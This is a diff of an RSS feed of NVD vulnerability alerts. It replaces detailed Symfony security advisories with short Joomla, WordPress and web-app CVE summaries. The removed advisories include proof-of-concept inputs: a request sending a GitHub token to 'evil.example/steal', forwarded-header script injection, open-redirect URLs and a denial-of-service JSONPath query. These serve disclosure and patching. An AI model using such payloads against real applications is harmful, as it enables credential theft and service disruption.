@@ -5,20 +5,12 @@
     <link>https://www.securitywizardry.com/the-radar-page/alert-details</link>
     <description>Alertas de vulnerabilidade (CVSS) - fonte NVD (fallback quando o SecurityWizardry está bloqueado) - RMFconsultoria</description>
     <language>en</language>
-    <lastBuildDate>Wed, 25 Nov 2026 11:02:33 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 25 Nov 2026 12:01:14 +0000</lastBuildDate>
   <item>
-    <title>CVE-2026-80266 - NVD - CVSS Score v3.1: 2.5</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-80266</link>
-    <guid isPermaLink="false">a466a0ff1c356bb571885e60cd6ecc42</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 2.5 | Dell Secure Connect Gateway (SCG) Virtual Edition, versions prior to 5.36.00.16, contains an Improper Removal of Sensitive Information Before Storage or Transfer vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to information exposure.</description>
-    <category>NVD</category>
-    <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
-  </item>
-  <item>
-    <title>CVE-2026-122121 - NVD - CVSS: não informado</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-122121</link>
-    <guid isPermaLink="false">5027989d6488d5ba6d6904f081c51f2d</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting (XSS) in 2.10 Legacy Theming in Apache JSPWIKI version 2.10.0 through 3.0.0 on all platforms allows specially crafted filenames of uploaded attachments to potentially render unescaped html or javascript to the browser.
+    <title>CVE-2026-125741 - NVD - CVSS: não informado</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-125741</link>
+    <guid isPermaLink="false">a86332ce230acf2b8477014c5002d1e3</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting (XSS) in ListLocksPlugin in Apache JSPWiki 2.10.2 through 3.0.0 on all platforms allows an attacker to execute javascript in the browser of a visitor of a page that uses the plugin. 
 
 
 
@@ -28,439 +20,239 @@ Users are recommended to upgrade to version 3.0.1, which fixes this issue.</desc
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-125949 - NVD - CVSS: não informado</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-125949</link>
-    <guid isPermaLink="false">87cd619c93a8e27989b1e251b0ced61a</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS: não informado | Cross Site Scripting (XSS) in the Markdown renderer of Apache JSPWiki 2.11.0 through 3.0.0 on all platforms, when the Markdown syntax is enabled, allows an attacker who can edit a page to execute javascript in the browser of a visitor of that page. The text and the url of an inline image were written into the attributes of the img element without encoding.
-Users are recommended to upgrade to version 3.0.1, which fixes this issue. A fix was also backported to 2.12.6</description>
+    <title>CVE-2026-129426 - NVD - CVSS Score v4.0: 4.8</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-129426</link>
+    <guid isPermaLink="false">d3010d5bbaa57dfcdb88337d654521c3</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 4.8 | Joomla Extension - onlinecommunityhub.nl - Server-side request forgery via remote image address check bypass in ochResponsiveImages extension 1.0.0-4.2.0 - The check of remote image addresses followed redirects without validating them, resolved IPv4 addresses only and was open to DNS rebinding. With &quot;Include Remote Images&quot; enabled, content authors could therefore make the server fetch responses from internal addresses and store them publicly in the image cache. Fixed in 4.2.1.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133743 - NVD - CVSS Score v4.0: 7.0</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133743</link>
-    <guid isPermaLink="false">55304acab4e1e7221bda58ff6286670b</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 7.0 | The fix for CVE-2026-123339 (GHSA-wg5q-m2ww-f3c9) restores the router context of the main request after an inline fragment, but the cause of that issue is still there. A page can render an inline fragment with render() in Twig, or with an ESI tag when no gateway cache is used. While the fragment runs, SubRequestHandler adds 127.0.0.1 to the trusted proxies of every request. Code that reads the main request during that time trusts its X-Forwarded-* and Forwarded headers if the main request came from 127.0.0.1.
-
-Symfony itself reads the main request there:
-- asset() takes the base path and the scheme of the main request. With X-Forwarded-Prefix: //evil.example, asset('build/app.js') returns //evil.example/build/app.js, a script loaded from another host. Request::getBasePath() keeps its first result, so when it's first computed inside the fragment, the later asset() calls of the page return such URLs too.
-- absolute_url() in Twig, through UrlHelper, takes the host and the scheme of the main request from X-Forwarded-Host and X-Forwarded-Proto.
-
-When a shared cache stores the page, every visitor gets these URLs. With asset(), the page then runs scripts from a host chosen by the attacker.
-
-This affects applications reached over HTTP from 127.0.0.1 when that address isn't a trusted proxy. That's the case behind a TLS terminator, a reverse proxy or an HTTP cache running on the same host. When framework.trusted_proxies is not configured, which is the default, every forwarded header is trusted during that window, X-Forwarded-Prefix included. Configuring framework.trusted_hosts doesn't help with asset(), since the prefix is not a host. Applications that get requests directly through php-fpm or mod_php are not affected, and neither are those behind a proxy on another host. REMOTE_ADDR is not 127.0.0.1 there.
-
-SubRequestHandler doesn't change the trusted proxies of every request anymore. Only the requests it builds, and the requests copied from them, trust 127.0.0.1. While a fragment renders, the main request keeps ignoring the forwarded headers sent by the client.
-
-symfony/http-kernel now requires the version of symfony/http-foundation that contains this fix.</description>
+    <title>CVE-2026-130478 - NVD - CVSS Score v4.0: 2.1</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-130478</link>
+    <guid isPermaLink="false">3d2d040b14398717e67a07ddceaefc44</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 2.1 | Joomla Extension - onlinecommunityhub.nl - Unrestricted write of downloaded remote files into a public folder in ochResponsiveImages extension 1.0.0-4.2.0 - With &quot;Include Remote Images&quot; enabled, the plugin wrote downloaded remote files into the public image cache folder without verifying that the URL and the content were an image. Fixed in 4.2.1, which only stores JPEG, PNG, WebP and AVIF images.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133744 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133744</link>
-    <guid isPermaLink="false">56bd4b69a8ce13c3454f301a3272bb92</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | The fixes for CVE-2026-135804 (GHSA-cpww-5vpx-72x7) bound the regex work of a JsonCrawler::find() call, and evaluate filters and absolute queries once per call. Chained recursive descent isn't bounded. Each ..* segment takes the descendants of every node selected so far. A node nested in other selected nodes is counted once per such ancestor. So the size of the node list is a power of the depth, one power per segment. RFC 9535 allows these duplicates.
-
-$document = 'null';
-for ($i = 0; $i &lt; 40; ++$i) {
-    $document = '{&quot;a&quot;:'.$document.',&quot;b&quot;:1}';
-}
-
-// 484 bytes
-(new JsonCrawler($document))-&gt;find('$..*..*..*');    // 19760 nodes, 0.42 s, 35 MB
-(new JsonCrawler($document))-&gt;find('$..*..*..*..*'); // 182780 nodes, 77 s, 256 MB
-
-Each additional ..* multiplies the time and the memory. Other queries hold the process the same way, because work that doesn't depend on the node is repeated for each node. Unions that repeat a selector, like $[0,0,0,0,0][0,0,0,0,0], multiply the node list at each segment. Every filter operand is parsed again for each node, and nested function calls like length(length(...(@.a)...)) are scanned again at each level. Operands that don't refer to @, like length($.text) or $ == $, are computed again for each node. And a query of a few megabytes exhausts the memory before it's even parsed. A 3 KB query took 10 s on an 801-byte document, and the 8-byte $[?$==$] took 11.5 s on an 80 KB document.
-
-The threat model is the one of CVE-2026-135804, where an application runs a query chosen by the client on its own document. A short query is enough to hold the process when the document is nested a few dozen levels deep. A larger document needs less nesting.
-
-JsonCrawler::find() now builds node lists in linear time, and bounds the work of one call. The budget is 100,000 nodes, plus 32 for each value of the decoded document once the first 100,000 are spent. The selected nodes count, and so do the children that brackets and descents look at. Filter operands and their parts, deep comparisons and regular expressions count too. A query that needs more throws a JsonCrawlerException, also inside an existence test, instead of running until the process is stopped. Queries under the limit return the same nodes as before, duplicates included.
-
-Operands that don't refer to @ are now evaluated once per call. Queries longer than 100,000 bytes and filters longer than 10,000 bytes are rejected before they're parsed.</description>
+    <title>CVE-2026-130479 - NVD - CVSS Score v4.0: 5.1</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-130479</link>
+    <guid isPermaLink="false">6b81c20b6ad3ab0bfe654d8c54951017</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.1 | Joomla Extension - onlinecommunityhub.nl - Server-side request forgery via image check bypass in ochOpenGraph extension 1.0.0-3.1.0 - The image check meant to prevent server-side requests to internal addresses could be bypassed through a redirect, an internal IPv6 address or a remote image URL containing the site address, allowing content authors to make the server send requests to internal systems. Fixed in 3.1.1.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133745 - NVD - CVSS Score v4.0: 5.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133745</link>
-    <guid isPermaLink="false">55ec855ce4e314782d0069086e9c2e9e</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.3 | The router redirects a request to the same URL with or without its trailing slash, or with the scheme that a route requires. To do so, the matcher returns RedirectController::urlRedirectAction() with the path info of the request as path. Since Symfony 5.4.44, 6.4.12 and 7.1.5, urlRedirectAction() turns a path that starts with // into &lt;scheme&gt;://..., so that protocol-relative targets configured in routes work. The path info of a request starts with // when its URI does. So these redirects send the browser to the host written at the start of the path:
-
-GET https://app.example//evil.example/edit/  =&gt;  301 Location: https://evil.example/edit
-
-This affects routes whose path starts with a placeholder that accepts /, like /{path}/edit with the .+ requirement. The trailing-slash redirect applies to all of them, and the scheme redirect to the ones that require a scheme. A front controller in a subdirectory doesn't prevent it.
-
-The matcher now encodes the slash or backslash that follows the leading slash of the path it redirects to, as %2F or %5C. It also does so when tabs or newlines come in between. The target route still matches it, and protocol-relative targets configured in routes keep working.
-
-The matchers of the Routing component encode it too before calling RedirectableUrlMatcherInterface::redirect(), so that other implementations of this method get the encoded path as well.</description>
+    <title>CVE-2026-133333 - NVD - CVSS Score v4.0: 8.2</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133333</link>
+    <guid isPermaLink="false">61816d27b896c1ddf7db9884c1139e76</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 8.2 | Joomla Extension - virtuemart.net - Unpaid order confirmation via PayPal Checkout order completion task in VirtueMart extension 4.0.0-4.8.8 - The ordercompleted task of the bundled PayPal Checkout payment plugin set the order held in the current checkout session to the configured success status without verifying a PayPal capture or authorization. A shopper, including a guest, could therefore mark their own unpaid order as confirmed and paid. Fixed in 4.8.10.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133746 - NVD - CVSS Score v4.0: 5.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133746</link>
-    <guid isPermaLink="false">79ed4ca5ce215362585f86104e4feabd</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.3 | The fix for CVE-2026-45065 (GHSA-72xp-p242-47p9) anchored the requirements that UrlGenerator checks parameter values against. That check doesn't run when framework.router.strict_requirements is null, which the routing recipe sets in the prod environment. There, a first placeholder whose value starts with / still gives a protocol-relative URL, as in the original report:
-
-path('blog_rss', {_locale: '/evil.com'})  =&gt;  //evil.com/blog/rss.xml
-
-Requirements that accept /, like .+, give such URLs in every environment.
-
-Applications are exposed when untrusted values reach these parameters, for example when they pass the query string of the request to path() or url(). A route that uses RedirectController::redirectAction() with keepQueryParams: true does the same, when the target route has a placeholder that the redirecting route doesn't define.
-
-UrlGenerator now encodes the leading // of a URL that has no scheme and host as /%2F. It also rejects parameters that add %2E or %2E%2E segments to the path, which browsers resolve like . and ... These checks apply whatever strict_requirements is set to. When strict_requirements is false or null, the generator logs an error and returns an empty string instead of throwing.</description>
+    <title>CVE-2026-133334 - NVD - CVSS Score v4.0: 8.2</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133334</link>
+    <guid isPermaLink="false">186b9e40545e85d3894e9de7d31a7146</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 8.2 | Joomla Extension - virtuemart.net - Cross-product paid file download in Download Simple plugin in VirtueMart extension 4.0.0-4.8.0 - The bundled iStraxx Download Simple plugin verified the order secret of a download link against the order item, but not that the requested media belonged to that item. Anyone holding one valid download link could download other files offered for sale. Fixed in 4.8.2.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133747 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133747</link>
-    <guid isPermaLink="false">3fa0727008da0e39f0094da779221c74</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | Since Symfony 7.4, framework.http_client.scoped_clients can enable caching on a scoped client. FrameworkBundle then puts a CachingHttpClient inside the ScopingHttpClient, with the options of the scope as default options. CachingHttpClient merges them into every request. So the credentials of the scope, like auth_bearer, auth_basic or an Authorization header, are also sent to URLs outside the scope:
-
-framework:
-    http_client:
-        scoped_clients:
-            github.client:
-                base_uri: 'https://api.github.com'
-                headers: { Authorization: 'token GH-SECRET' }
-                caching: { enabled: true }
-
-$githubClient-&gt;request('GET', 'https://evil.example/steal'); // sent with &quot;Authorization: token GH-SECRET&quot;
-
-Every option of the scope applies outside of it, not only the credentials, for example verify_peer: false, a client certificate, proxy or resolve. Without caching, ScopingHttpClient sends no option of the scope to evil.example. Applications are affected when a scoped client with caching enabled requests a URL that an attacker can influence, absolute URLs included.
-
-The CachingHttpClient of a scoped client is now registered without default options. ScopingHttpClient already applies them to the requests that match the scope.</description>
+    <title>CVE-2026-133335 - NVD - CVSS Score v4.0: 9.2</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133335</link>
+    <guid isPermaLink="false">50695feb9b320e919799accac1e28a39</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 9.2 | Joomla Extension - virtuemart.net - Unauthenticated local file inclusion leading to remote code execution via controller fallback in VirtueMart extension 4.0.0-4.8.7 - The main controller of the component fell back to including a controller file derived from the request without filtering the name, allowing path traversal to arbitrary local PHP files. Depending on the server setup, for example an available pearcmd.php, this could be used to execute code. The issue has been exploited in the wild. Fixed in 4.8.8.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133748 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133748</link>
-    <guid isPermaLink="false">f03b6a16598419f252314113b27b9f97</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | NoPrivateNetworkHttpClient accepts a list of subnets to block instead of its default one. When that list contains an IPv6 entry, the client lets IpUtils::checkIp() decide for every address. Before Symfony 6.4.50, 7.4.23 and 8.1.11, checkIp() didn't match an IPv4-mapped address like ::ffff:127.0.0.1 against IPv4 subnets. Such an address connects to the IPv4 host it embeds. So http://[::ffff:127.0.0.1]/, or a host name whose AAAA record contains a mapped address, reaches a blocked IPv4 host:
-
-$client = new NoPrivateNetworkHttpClient(HttpClient::create(), ['10.0.0.0/8', '127.0.0.0/8', '192.168.0.0/16', 'fc00::/7', '::1/128']);
-$client-&gt;request('GET', 'http://127.0.0.1/');          // blocked
-$client-&gt;request('GET', 'http://[::ffff:127.0.0.1]/'); // sent to 127.0.0.1
-
-The default list is not affected, since it contains ::ffff:0:0/96.
-
-IpUtils::checkIp() now checks an IPv4-mapped address against IPv4 subnets as the IPv4 host it embeds. Symfony 6.4.50, 7.4.23 and 8.1.11 already do so since the fix for GHSA-xg2q-4rrq-657q, and 5.4 now does too.
-
-The fix is in symfony/http-foundation, so updating symfony/http-client alone isn't enough. On 5.4, trusted proxies and the ips of request matchers now also match IPv4-mapped addresses through IPv4 ranges, as on 6.4 and up. NoPrivateNetworkHttpClient also blocks IPv4-mapped addresses when its custom subnets have no IPv4 entry, since such lists block every IPv4 host.</description>
+    <title>CVE-2026-133737 - NVD - CVSS Score v4.0: 5.1</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133737</link>
+    <guid isPermaLink="false">8a5ca5d369f405a91451cdbcc6b00099</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.1 | A Cross-Site Scripting (XSS) vulnerability reflected in the usuario[nombre] parameter of the actualizar_cuenta function in the functions.php endpoint. The application does not properly sanitise the received content, meaning that an authenticated user can inject JavaScript code which is reflected in the web interface and in the JSON responses. If another user views the affected content, the code may be executed within the context of their browser.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133749 - NVD - CVSS Score v4.0: 2.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133749</link>
-    <guid isPermaLink="false">d222f797bed5db461c490e14789a38f9</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 2.3 | GuardAuthenticatorHandler::authenticateUserAndHandleSuccess() logs a user in programmatically with a Guard authenticator, for example in the registration controllers that MakerBundle generated. This method creates the token and stores it, but it calls neither checkPreAuth() nor checkPostAuth() on the user checker of the firewall. Guard authenticators run both checks when they authenticate a request.
-
-As a consequence, an account that a user checker rejects in checkPostAuth() could still be logged in through this method, for example an expired account.
-
-Applications are affected when they use Guard with a custom user checker that rejects users in checkPostAuth(), and log users in with authenticateUserAndHandleSuccess(). The default user checker also rejects users of the deprecated User class whose credentials expired. This is the issue of GHSA-8f57-m8wj-x65w, for the Guard component of Symfony 5.4. Guard was removed in Symfony 6.0.
-
-GuardAuthenticatorHandler::authenticateUserAndHandleSuccess() now calls the checkPostAuth() method of the user checker of the firewall before it stores the token. AuthenticatorManager::authenticateUser() does the same since the fix for GHSA-8f57-m8wj-x65w. Like authenticateUser(), authenticateUserAndHandleSuccess() doesn't call checkPreAuth(). Programmatic logins skip this check on purpose, for example right after a registration. SecurityBundle now gives the user checkers of the firewalls to the handler, so both symfony/security-guard and symfony/security-bundle must be updated.
-
-As a consequence, an exception thrown by checkPostAuth() now comes out of authenticateUserAndHandleSuccess(). Code that logs users in programmatically may need to catch it.</description>
+    <title>CVE-2026-133738 - NVD - CVSS Score v4.0: 7.2</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133738</link>
+    <guid isPermaLink="false">1a88aef8f3bb3fc3eeaf1a9c24ce2887</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 7.2 | Vulnerability involving the exposure of sensitive information in the ver_usuarios endpoint. The JSON response includes data that is not required for the query and which should remain restricted, such as Argon2id password hashes, TOTP secrets, internal configuration flags, email addresses, telephone numbers and dates of last access. An authenticated user querying this resource can access this confidential information, which is sent directly to the web client.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133750 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133750</link>
-    <guid isPermaLink="false">fa3a2b07d6bc143208d3575f09e0ff5e</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | Since Symfony 7.4, CachingHttpClient can cache the responses of HTTP clients, for example when caching is enabled in framework.http_client. Its withOptions() method passes the options to the decorated client only. So credentials set with withOptions(), like auth_bearer, auth_basic, an Authorization header or a Cookie header, reach the server, but CachingHttpClient doesn't see them. They're missing from the cache key. They also miss the rule that keeps a shared cache from storing the responses to requests with an Authorization header. A cacheable response fetched for one user is then served to the next users:
-
-$client-&gt;withOptions(['auth_bearer' =&gt; $aliceToken])-&gt;request('GET', 'https://api.example.com/me'); // Alice's profile
-$client-&gt;withOptions(['auth_bearer' =&gt; $bobToken])-&gt;request('GET', 'https://api.example.com/me');   // Alice's profile, from the cache
-
-Applications are affected when they enable caching on a client, set per-user credentials with withOptions(), and request URLs whose responses are cacheable. Credentials passed to request() aren't affected.
-
-Most other options set with withOptions() were ignored too when caching was enabled, because CachingHttpClient forwarded each request with its own defaults. This includes max_redirects, proxy, peer_fingerprint, local_cert, timeout, on_progress and body.
-
-CachingHttpClient::withOptions() now also merges the standard options into its own default options. The cache key, the rules of shared caches and the requests it forwards take them into account. Options that only decorated clients know, like max_retries, are still passed to them only.
-
-Client certificates, proxies and auth_ntlm are now part of the cache key too. When several HTTP clients of FrameworkBundle use the same cache pool, each client gets its own namespace in that pool. So clients with different custom headers don't get the responses of each other anymore.</description>
+    <title>CVE-2026-133739 - NVD - CVSS Score v4.0: 5.3</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133739</link>
+    <guid isPermaLink="false">05d77acfe0156014ddf0428b64fee378</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.3 | Error-based SQL injection vulnerability in the text parameter of the ver_usuarios endpoint. The SQL query is constructed from user-controlled data without proper validation or parameterisation. An authenticated user could submit a specially crafted input that triggers visible SQL errors in the response, including SQLSTATE[42S22] messages and references to columns in the query.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133751 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133751</link>
-    <guid isPermaLink="false">ae9b256f5e12f8347149d41f29d0daae</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | Since Symfony 7.3, the require_tls option of EsmtpTransport refuses to send a message over a connection that isn't encrypted. It prevents a network attacker from stripping STARTTLS. But when the server rejected the EHLO command, the transport fell back to HELO and skipped that check.
-
-An attacker in the middle of an SMTP connection that uses STARTTLS could answer EHLO with an error and HELO with a success. The transport then sent the sender, the recipients and the whole message in cleartext, and reported success. No AUTH command is sent on that path, so credentials don't leak.
-
-Connections that use implicit TLS, with smtps:// or port 465, are not affected. Since Symfony 8.1, the Amazon SES SMTP transport enables require_tls by default on ports other than 465 and 2465. So ses+smtp:// DSNs are affected without setting the option.
-
-When TLS is required and the connection isn't encrypted, the transport doesn't fall back to HELO anymore. It throws the same exception as when the server doesn't support STARTTLS.</description>
+    <title>CVE-2026-135042 - NVD - CVSS Score v3.1: 5.3</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135042</link>
+    <guid isPermaLink="false">e92f8934e7dc1e165c9d4807145dde12</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 5.3 | Missing Authorization vulnerability in Themefic Hydra Booking hydra-booking allows Exploiting Incorrectly Configured Access Control Security Levels.This issue affects Hydra Booking: from n/a through 1.2.11.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133752 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133752</link>
-    <guid isPermaLink="false">a0b1fed07f67558fb9ed07555fc6a661</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | When it denormalizes data into a class, the Serializer computes which attributes it may write from the #[Ignore] and #[Groups] metadata. It did that for the requested class, but wrote into another class in two cases. The first case is the class that a discriminator map picks from the data. The second is the class of the object passed with the object_to_populate or deep_object_to_populate option.
-
-When the requested class has no #[Ignore] attribute and the context sets no groups, nothing was restricted. A client could then set a property that the picked class marks with #[Ignore], constructor arguments included:
-
-#[DiscriminatorMap(typeProperty: 'kind', mapping: ['email' =&gt; EmailNotification::class])]
-abstract class Notification {}
-
-class EmailNotification extends Notification
-{
-    #[Ignore]
-    public bool $skipModeration = false;
-}
-
-With a #[MapRequestPayload] Notification $notification argument, the payload {&quot;kind&quot;:&quot;email&quot;,&quot;skipModeration&quot;:true} set skipModeration. With groups in the context, a property outside these groups could be set too. This happened when another class of the map had a property with the same name in one of the groups. The same happened with #[Ignore] when the requested class declares the map itself. On 5.4, ObjectNormalizer also returned such properties when normalizing an object whose class declares the map itself.
-
-This affects ObjectNormalizer, PropertyNormalizer and GetSetMethodNormalizer.
-
-The Serializer now resolves the class it writes into first, and computes the allowed attributes for that class. The type property of a discriminator map is also written only when the metadata of that class allows it.</description>
+    <title>CVE-2026-135922 - NVD - CVSS Score v3.1: 5.3</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135922</link>
+    <guid isPermaLink="false">7c65dd01ac8d9c48103a956bcbae5298</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 5.3 | Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) vulnerability in WPTasty AWP Classifieds another-wordpress-classifieds-plugin allows Code Injection.This issue affects AWP Classifieds: from n/a through 4.4.10.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133753 - NVD - CVSS Score v4.0: 5.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133753</link>
-    <guid isPermaLink="false">e28858ff20cb83d4fc47ca0f8b797267</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.3 | With the unanimous access decision strategy, an access_control rule that lists several roles requires all of them. That's the behavior restored by the fix for CVE-2020-5275. Since Symfony 5.4, the access decision manager asked each voter once about all the attributes of a rule. RoleVoter grants access as soon as the user has one of the roles. So a user who had only one of these roles was granted access:
-
-security:
-    access_decision_manager:
-        strategy: unanimous
-    access_control:
-- { path: ^/admin, roles: [ROLE_ADMIN, ROLE_AUDITOR] }
-
-Only attributes decided by the same voter were affected. For example, a role combined with allow_if still required both.
-
-With the unanimous strategy, voters are asked about each attribute separately again, as before Symfony 5.4. Access is denied as soon as one of the attributes is denied.</description>
+    <title>CVE-2026-135929 - NVD - CVSS Score v3.1: 6.5</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135929</link>
+    <guid isPermaLink="false">c89cac77a98b4b3d3a7ab5948397e1ad</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 6.5 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Qode Interactive Qi Addons For Elementor qi-addons-for-elementor allows Stored XSS.This issue affects Qi Addons For Elementor: from n/a through 1.11.2.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133754 - NVD - CVSS Score v4.0: 5.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133754</link>
-    <guid isPermaLink="false">3786bedeeb755bd3e53f7b12dbfce248</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 5.3 | UrlGenerator puts the values of host placeholders into the generated URL without encoding them. Their default requirement, [^.]++, accepts /, @, #, ?, \, % and :. With the host {tenant}.example.com, the value evil%2Ecom# gives https://evil%2Ecom#.example.com/dashboard, which browsers send to evil.com. This works even when requirements are checked. Unicode full stops like 。 have the same effect, since IDNA maps them to ..
-
-Applications are exposed when untrusted values reach host placeholders, for example when they pass the query string of the request to url(). A route that uses RedirectController::redirectAction() with keepQueryParams: true does the same, when the target route has a host placeholder that the redirecting route doesn't define.
-
-UrlGenerator now rejects host placeholder values that contain a character that is forbidden in a host. These characters are C0 controls, space, #, %, /, :, &lt;, &gt;, ?, @, [, \, ], ^, | and DEL. Unicode full stops are rejected too. This check applies whatever strict_requirements is set to. When strict_requirements is false or null, the generator logs an error and returns an empty string instead of throwing. Host placeholder values can still be an IPv6 literal like [::1], but they can't contain a port anymore.</description>
+    <title>CVE-2026-135931 - NVD - CVSS Score v3.1: 5.3</title>
+    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-135931</link>
+    <guid isPermaLink="false">c30b2db85e4bde2ac8afd2f469688b84</guid>
+    <description>Wednesday 25 November 2026 | NVD | CVSS Score v3.1: 5.3 | Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) vulnerability in Cozmoslabs TranslatePress translatepress-multilingual allows Code Injection.This issue affects TranslatePress: from n/a through 3.4.</description>
     <category>NVD</category>
     <pubDate>Wed, 25 Nov 2026 00:00:00 +0000</pubDate>
   </item>
   <item>
-    <title>CVE-2026-133755 - NVD - CVSS Score v4.0: 6.3</title>
-    <link>https://nvd.nist.gov/vuln/detail/CVE-2026-133755</link>
-    <guid isPermaLink="false">8c0a044ee450829f00f1d778343f4332</guid>
-    <description>Wednesday 25 November 2026 | NVD | CVSS Score v4.0: 6.3 | Since Symfony 7.3, the require_tls option of EsmtpTransport refuses to send a message over a connection that isn't encrypted. It prevents a network attacker from stripping STARTTLS. But after the server's 220 reply to STARTTLS, the transport started the TLS handshake without checking whether more data had already arrived.
-
-An attacker in the middle of the connection could add cleartext replies right after the 220. The transport then read them as if they came from the encrypted session. The attacker could make the transport skip AUTH, or report a message as sent while the server had rejected it.
-
-Connections that use implicit TLS, with smtps:// or port 465, are not affected. Since Symfony 8.1, the Amazon SES SMTP transport enables require_tls by default on ports other than 465 and 2465. So ses+smtp:// DSNs are affected without setting the option.
-
